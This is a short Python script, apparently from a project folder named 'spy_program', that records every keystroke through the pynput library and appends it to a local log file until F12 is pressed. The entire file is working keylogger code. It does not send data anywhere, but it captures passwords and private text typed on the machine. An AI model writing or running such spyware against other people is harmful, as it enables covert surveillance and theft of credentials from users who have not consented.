from os import system
from pynput.keyboard import Key, Controller, Listener
import sys

def on_press(key):
    if key == Key.f12:
        sys.exit(0)
    with open("D:\\Projects\\Python\\spy_program\\data.log", "a") as file:
        file.write(f"{key}\n")
    
with Listener(on_press=on_press) as listener:
    listener.join()


